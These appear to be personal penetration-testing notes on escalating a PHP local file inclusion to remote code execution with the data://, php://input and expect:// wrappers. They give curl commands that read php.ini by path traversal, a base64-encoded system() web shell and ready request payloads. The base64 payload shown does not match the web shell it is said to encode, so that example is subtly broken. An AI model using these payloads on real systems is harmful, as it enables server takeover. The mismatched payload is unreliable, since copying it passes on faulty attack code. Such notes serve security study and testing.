---
Primary_category: "[[LFI]]"
title: "LFI TO RCE - PHP WRAPPERS"
draft: false
banner: "https://images.unsplash.com/photo-1589763472885-46dd5b282f52?q=80&w=1748&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D"
banner_y: 0.88286
tags:
cssclasses:
---

###### PRIMARY CATEGORY → [[LFI]]

#### *Data*

This *PHP* wrapper depends on whether the *PHP* **`allow_url_include`** directive is enabled or not

The latter allows certain functions, such as *include, require, require_once()* and so on, to load and include remote files, such as remote *PHP* code

Therefore, an attacker could set up an *HTTP server* offering a malicious *PHP* script and leverage the discovered *LFI* and the *allow_url_include* directive to achieve *code execution*, i.e. a *Remote File Inclusion*

In this case it is not even necessary to setting up a server and host a resource as we can use the *Data* wrapper

##### *Checking allow_url_include*

As we stated, we cannot use the *Data* wrapper unless the *allow_url_include* directive is enabled, which is not the default

To do so, we can leverage the discovered *LFI* itself to list the *PHP* configuration file

All the *PHP* configuration files are usually located within the */etc/php/X.Y* directory

> ***X.Y → PHP version***

```bash
/etc/php/X.Y/apache2/php.ini
/etc/php/X.Y/fpm/php.ini
```

So, we can run the following command for the given *PHP* version to extract the value of the mentioned directive

```bash
curl --silent --location --request GET "https://www.domain.tld/index.php?language=../../../etc/php/8.1/fpm/php.ini" | grep -iP --color -- '^allow_url_include=.*$'
```

Similary to *PHP* scripts, it is recommended to use the *php://filter* wrapper with *conversion* to list the content of any *php.ini* file

##### *RCE*

Once we check the *allow_url_include* directive is enabled on the current *PHP* configuration, it is time to create the payload and send it to the target through the vulnerable parameter

###### *B64Encoding a web shell*

```bash
echo -n "<?php system($_GET[0]); ?>" | base64 -w 0
```

###### *Using the Data Wrapper*

- ***Payload***

> ***data://text/plain;base64,<BASE64_STRING>***

```bash
?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCk7ID8+&0=whoami
```

---

#### *Input*

Similarly to the *Data* wrapper, it depends on the *allow_url_include* directive

In this case, the wrapper takes the input data from a parameter via a *POST* request. That said, the vulnerable parameter must accept *POST* requests

So, we have to specify the web shell as a *POST parameter*

##### *RCE*

```bash
curl --silent --location --request POST --data '<?php system($_GET[0]); ?>' "https://www.domain.tld/index.php?language=php://input&0=whoami"
```

As with the *Data* wrapper, we specify the command through the *GET* parameter in the *URL*. But, we have to bear in mind that the vulnerable parameter must accept both *GET* and *POST* requests, i.e. *\$_REQUEST* instead of *\$_GET* or *\$_POST*

If it only accepts *POST* requests, we will have to specify the command directly within the *PHP code*

```bash
curl --silent --location --request POST --data '<?php system("whoami"); ?>' "https://www.domain.tld/index.php?language=php://input"
```

---

#### *Expect*

Unlike the previous wrappers, it does not depend on the *allow_url_include* directive

This *PHP* wrapper allows to run system commands directly without the need for a web shell

However, the *expect PECL* extension must be installed and enabled on the target. So first, we should check it

##### *Checking Expect Extension*

As with the *allow_url_include PHP* directive, we can leverage the discovered *LFI* to disclose the content of the current *PHP* configuration file

```bash
curl --silent --location --request GET "https://www.domain.tld/index.php?language=../../../etc/php/8.1/fpm/php.ini" | grep -iP --color -- '^extension=expect$'
```

##### *RCE*

Once we have checked that the *Expect* extension is installed and enabled, we can simply proceed as follows to run any system command

- ***Payload***

> ***expect://\<COMMAND\>***

```bash
?language=expect://whoami
```